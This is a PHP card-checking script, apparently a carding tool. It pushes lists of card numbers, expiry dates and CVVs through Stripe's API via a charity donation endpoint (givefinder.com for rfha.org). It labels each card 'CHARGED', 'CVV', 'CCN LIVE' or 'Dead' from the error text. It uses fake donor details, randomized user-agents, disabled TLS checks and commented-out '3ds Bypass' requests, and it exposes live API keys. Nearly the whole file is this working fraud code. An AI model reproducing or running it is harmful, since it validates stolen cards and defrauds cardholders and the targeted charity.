<?php

############Kingsahil##########
############[PHP SETUP]#############

          error_reporting(0);
          set_time_limit(0);
          error_reporting(0);
          date_default_timezone_set('America/Buenos_Aires');

          // https://www.gosh.org/_donate/?amount=1&frequency=single&campaign=1856

 

#########################[Functions + Lista]############################
         
          function multiexplode($delimiters, $string){
                  $one = str_replace($delimiters, $delimiters[0], $string);
                  $two = explode($delimiters[0], $one);
          return $two;}

                  $lista = $_GET['lista'];
                  $cc   = multiexplode(array(":", "|", " "), $lista)[0];
                  $mes  = multiexplode(array(":", "|", " "), $lista)[1];
                  $ano = multiexplode(array(":", "|", " "), $lista)[2];
                  $cvv  = multiexplode(array(":", "|", " "), $lista)[3];
                  
          function GetStr($string, $start, $end){
                  $str = explode($start, $string);
                  $str = explode($end, $str[1]);
          return $str[0];}

                  $amount = 'Charge : $'.rand(3,7).'.'.rand(01,99);
                  $amount2 = 'Not Charged';

          function value($str,$find_start,$find_end){
                  $start = @strpos($str,$find_start);
          if ($start === false){
          return "";}
                  $length = strlen($find_start);
                  $end    = strpos(substr($str,$start +$length),$find_end);
          return trim(substr($str,$start +$length,$end));}
          function mod($dividendo,$divisor){
          return round($dividendo - (floor($dividendo/$divisor)*$divisor));}

          function AllinOne($data = 42){
                return substr(strtolower(sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535))), 0, $data);};
           

#####################################

                  $guid = AllinOne();
                  $muid = AllinOne();
                  $sid = AllinOne();

#####################################
                  $time_on_page  = ucfirst(str_shuffle('67818'));
                  $z1  = substr($cc,0,3);
                  $z2  = substr($cc,3,6);
##################################################################
 

// $curl = curl_init();

// $email = urlencode('mikesmith@gmail.com');
// $url = "https://email-checker.p.rapidapi.com/verify/v1?email=$email";

// $headers = array(
//     'Accept: */*',
//     'Accept-Encoding: gzip, deflate, br',
//     'Accept-Language: en-US,en;q=0.9',
//     'Origin: https://www.rfha.org',
//     'Referer: https://www.rfha.org/',
//     'Sec-Fetch-Dest: empty',
//     'Sec-Fetch-Mode: cors',
//     'Sec-Fetch-Site: cross-site',
//     'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
//     'X-RapidAPI-Host: email-checker.p.rapidapi.com',
//     'X-RapidAPI-Key: 58083a91d7msh8cad0af07c36c9dp1f78e0jsn8098d51e157d'
// );

// curl_setopt_array($curl, array(
//     CURLOPT_URL => $url,
//     CURLOPT_RETURNTRANSFER => true,
//     CURLOPT_ENCODING => '',
//     CURLOPT_MAXREDIRS => 10,
//     CURLOPT_TIMEOUT => 0,
//     CURLOPT_FOLLOWLOCATION => true,
//     CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
//     CURLOPT_CUSTOMREQUEST => 'GET',
//     CURLOPT_HTTPHEADER => $headers,
// ));

// $response = curl_exec($curl);

// curl_close($curl);

// echo $response;
#########################[1 REQ]############################


        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: api.stripe.com',
               'method: POST',
               'path: /v1/payment_methods',
               'scheme: https',
               'accept: application/json',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/x-www-form-urlencoded',
               'origin: https://js.stripe.com',
               'referer: https://js.stripe.com/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[email]=mikesmith%40Gmail.com&billing_details[address][postal_code]=10080&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=02a95d82-1df4-440c-934f-51794bee3968265107&muid=44c4d541-8d93-43a7-95b2-7e42882afe4f06a025&sid=6e641d32-07b5-4b7a-8383-71e2bcea3b91474f23&pasted_fields=number&payment_user_agent=stripe.js%2Fed398fe5b%3B+stripe-js-v3%2Fed398fe5b&time_on_page=140151&key=pk_live_51K8XUYCZCOPnYN8IT81xY9djJx6umWES3YML3SslbcTqsVgVfohFmuivxLQCSY3CQmsP25KqnrM70vjSXknCKMVb00av2KXxyy');
        
        $r1 = curl_exec($ch);
        $id = Getstr($r1,'"id": "','"');



###################################[cs_live take]#####################
   $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.givefinder.com/api/donor/create_donation');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'method: POST',
               'scheme: https',
               'accept: application/json, text/javascript, */*; q=0.01',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/x-www-form-urlencoded; charset=UTF-8',
               'origin: https://www.rfha.org',
               'referer: https://www.rfha.org/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'email=mikesmith%40Gmail.com&amount=1.00&currency=USD&payment_method='.$id.'&business_name=&company_reg_number=&donate_as=individual&first_name=Mike&last_name=smith&zip_code=10080&dedication=in-honor-of&honor_Name=&cc_donor=recieve-copy&donor_name=&honered_email=&design_id=1&personal_message=');


               $get_cslive = curl_exec($ch);
// echo $get_cslive;
            $client_secret = 
    Getstr($get_cslive,'"client_secret":"','"');
$pi = 
    Getstr($get_cslive,'"client_secret":"','_secret');
// echo $client_secret;
    
      

// ############################[2 Req]############################
 
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'/confirm');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: api.stripe.com',
               'method: POST',
               'path: /v1/payment_pages/'.$cslive.'/confirm',
               'scheme: https',
               'accept: application/json',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/x-www-form-urlencoded',
               'origin: https://checkout.stripe.com',
               'referer: https://checkout.stripe.com/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][email]=mikesmith%40Gmail.com&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=02a95d82-1df4-440c-934f-51794bee3968265107&payment_method_data[muid]=44c4d541-8d93-43a7-95b2-7e42882afe4f06a025&payment_method_data[sid]=6e641d32-07b5-4b7a-8383-71e2bcea3b91474f23&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fed398fe5b%3B+stripe-js-v3%2Fed398fe5b&payment_method_data[time_on_page]=143023&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51K8XUYCZCOPnYN8IT81xY9djJx6umWES3YML3SslbcTqsVgVfohFmuivxLQCSY3CQmsP25KqnrM70vjSXknCKMVb00av2KXxyy&client_secret='.$client_secret.'');
        
        $result31 = curl_exec($ch);
// echo $r2;
      
//        $stripe_js = Getstr($r2,'"stripe_js": "','"');
//       $src = Getstr($r2,'"three_d_secure_2_source": "','"');
     
//      $client_secret = Getstr($r2,'"client_secret": "','"');
//     $pi = Getstr($r2,'"client_secret": "','_secret');
    

// #####################[3ds Bypass using url]#############
// if (strpos($r2, "https://hooks.stripe.com/redirect/authenticate/"))   
// {
//          $ch = curl_init();
//           $bin = substr($cc, 0,6);
//           curl_setopt($ch, CURLOPT_URL, ''.$stripe_js.'');
//           curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//                   $r4 = curl_exec($ch);
             
// }
// #####################[3ds Bypass using url]#############
// if (strpos($r2, "three_d_secure_2_source"))   
// {
//                 $ch = curl_init();
//         curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
//         curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//         curl_setopt($ch, CURLOPT_HEADER, 0);
//         curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//                'authority: api.stripe.com',
//                'method: POST',
//                'path: /v1/3ds2/authenticate',
//                'scheme: https',
//                'accept: application/json',
//                'accept-language: en-US,en;q=0.9',
//                'content-type: application/x-www-form-urlencoded',
//                'origin: https://js.stripe.com',
//                'referer: https://js.stripe.com/',
//                'sec-fetch-dest: empty',
//                'sec-fetch-mode: cors',
//                'sec-fetch-site: same-origin',
//                'sec-gpc: 1',
//                'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
//         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//         curl_setopt($ch, CURLOPT_POSTFIELDS, 'source='.$src.'&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22864%22%2C%22browserScreenWidth%22%3A%221536%22%2C%22browserTZ%22%3A%22-330%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F109.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51HP2WxDtYuzMl8oxGIjU2GakXYVkZvUJMOVRokOJ97g7VNGLb5FVP5CIRQjU5JnOcqeqW4XEFOp2rTNa92oTfRZ100avSDHKRk');
        
//         $srcresult = curl_exec($ch);
      
//   }
// ########################[result url]#####################

//     $ch = curl_init();
//           curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'?key=pk_live_51HP2WxDtYuzMl8oxGIjU2GakXYVkZvUJMOVRokOJ97g7VNGLb5FVP5CIRQjU5JnOcqeqW4XEFOp2rTNa92oTfRZ100avSDHKRk&is_stripe_sdk=false&client_secret='.$client_secret.'');
//           curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//           curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//                   $result31 = curl_exec($ch);


########################[Responses]############################
///// [2REQ - RSOP]

if(strpos($result31,'"status": "succeeded')){
  $status = '#CHARGED';
  $cc_code = '『 CHARGE PASS✅= 』';
  $reqfind = '2 Req';
}

// elseif(strpos($result31,'Membership Confirmation')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31,'Thank you for your support')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31,'Thank you for your donation')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31,'/wishlist-member/?reg=')){
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, 'Thank You')) {
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, '\"success\":true')) {
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, 'pass')) {
//   $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';
// }

// elseif(strpos($result31, 'wcf-key')) {
//  $status = '#CHARGED';
//   $cc_code = '『 CHARGE PASS✅= 』';
//   $reqfind = '2 Req';

  
// }

elseif(strpos($result31, 'incorrect_zip')) {
  $status = '#CVV';
  $cc_code = '『 incorrect_zip ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, 'transaction_not_allowed')) {
  $status = '#CVV';
  $cc_code = '『 transaction_not_allowed ✅ 』';
  $reqfind = '2 Req';
}
elseif (strpos($result31,'Your card does not support this type of purchase.')) {
  $status = '#CVV';
  $cc_code = '『 Your card does not support this type of purchase ✅ 』';
  $reqfind = '2 Req';
}
elseif (strpos($result31,'card does not support this type of purchase.')) {
  $status = '#CVV';
  $cc_code = '『 Your card does not support this type of purchase ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, '\"cvc_check\": \"pass\"')) {
  $status = '#CVV';
  $cc_code = '『 CVC_CHECK: PASS ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, 'Your card has Insufficient Funds ✅.')) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, 'card has Insufficient Funds ✅.')) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "security code is incorrect." )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "security code is invalid" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "Security code is incorrect" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "incorrect_cvc" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "Your card is not supported" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card is not supported 』';
  $reqfind = '2 Req';
}
  elseif(strpos($result31, "card is not supported" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card is not supported 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "Your card was declined" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card was declined 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "fraudulent" )) {
  $status = 'Dead❌';
  $cc_code = '『 fraudulent 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "do_not_honor" )) {
  $status = 'Dead❌';
  $cc_code = '『 do_not_honor 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "generic_decline" )) {
  $status = 'Dead❌';
  $cc_code = '『 generic_decline 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "card was declined" )) {
  $status = 'Dead❌';
  $cc_code = '『 card was declined 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "Your card number is incorrect" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card number is incorrect 』';
  $reqfind = '2 Req';
}
  elseif(strpos($result31, "card number is incorrect" )) {
  $status = 'Dead❌';
  $cc_code = '『 Your card number is incorrect 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "pickup_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Pickup Card (Reported Stolen Or Lost 』';
  $reqfind = '2 Req';
}
elseif(strpos($result31, "payment_intent_authentication_failure" )) {
  $status = 'Dead❌';
  $cc_code = '『 The provided PaymentMethod has failed authentication 』';
  $reqfind = '2 Req';
}
else{
  $status = 'Dead❌';
  $cc_code = '『 Problem Not Detected Form Ur cards 』';
  $reqfind = '2 Req';
}




//=======================[Responses-END]==============================//


    echo '</br>'.$MADEBY.' ['.$status.'] '.$lista.''.$cc_code.''.$bindata1.'</br>';

    echo "<b>Last result=</b>$result31<br><br>";
    
   
?> 